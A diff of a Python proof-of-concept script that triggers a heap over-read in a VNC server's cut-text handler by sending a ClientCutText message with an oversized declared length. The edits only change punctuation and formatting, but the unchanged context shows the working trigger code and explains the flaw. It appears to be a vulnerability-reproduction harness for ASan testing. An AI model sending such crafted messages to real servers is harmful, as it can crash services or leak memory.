@@ -20,7 +20,7 @@ The server does:
 
 Because `length` is never bounded, the callback receives the raw attacker value.
 Our custom server callback allocates SANE_MAX=32 bytes and ASan-poisons
-bytes [32..length-1], then memcpy's `length` bytes from str — crossing the
+bytes [32..length-1], then memcpy's `length` bytes from str - crossing the
 poison boundary and triggering an ASan heap-buffer-overflow READ.
 
 We send `length` = SANE_MAX + OVERREAD (e.g. 32 + 64 = 96 declared bytes)
@@ -41,7 +41,7 @@ import time
 SANE_MAX = 32
 # Extra bytes beyond SANE_MAX that the over-read will consume
 OVERREAD = 64
-# Total declared length — must equal the bytes we actually send so
+# Total declared length - must equal the bytes we actually send so
 # rfbReadExact() returns without blocking, and all bytes reach setXCutText.
 DECLARED_LEN = SANE_MAX + OVERREAD  # 96
 
@@ -128,7 +128,7 @@ def send_cuttext_trigger(sock: socket.socket) -> None:
     delivers all bytes to setXCutText(str, DECLARED_LEN, cl).
 
     The server's setXCutText callback allocates SANE_MAX bytes, poisons
-    bytes [SANE_MAX..DECLARED_LEN-1], then memcpy's DECLARED_LEN bytes —
+    bytes [SANE_MAX..DECLARED_LEN-1], then memcpy's DECLARED_LEN bytes -
     crossing the ASan fence at byte SANE_MAX and aborting.
     """
     # Build exactly: type(1) + pad(3) + length(4) = 8 bytes
@@ -142,13 +142,14 @@ def send_cuttext_trigger(sock: socket.socket) -> None:
     payload = b"A" * SANE_MAX + b"X" * OVERREAD
     assert len(payload) == DECLARED_LEN
 
-    print(f"[*] Sending rfbClientCutText: type=6, length={DECLARED_LEN} "
-          f"(SANE_MAX={SANE_MAX}, OVERREAD={OVERREAD})")
+    print(
+        f"[*] Sending rfbClientCutText: type=6, length={DECLARED_LEN} "
+        f"(SANE_MAX={SANE_MAX}, OVERREAD={OVERREAD})"
+    )
     print(f"[*] Header: {header.hex()}")
-    print(f"[*] Payload: {len(payload)} bytes "
-          f"({SANE_MAX} 'A' + {OVERREAD} 'X')")
+    print(f"[*] Payload: {len(payload)} bytes ({SANE_MAX} 'A' + {OVERREAD} 'X')")
     sock.sendall(header + payload)
-    print("[*] Message sent — waiting for ASan abort in server...")
+    print("[*] Message sent - waiting for ASan abort in server...")
 
 
 def main() -> None:
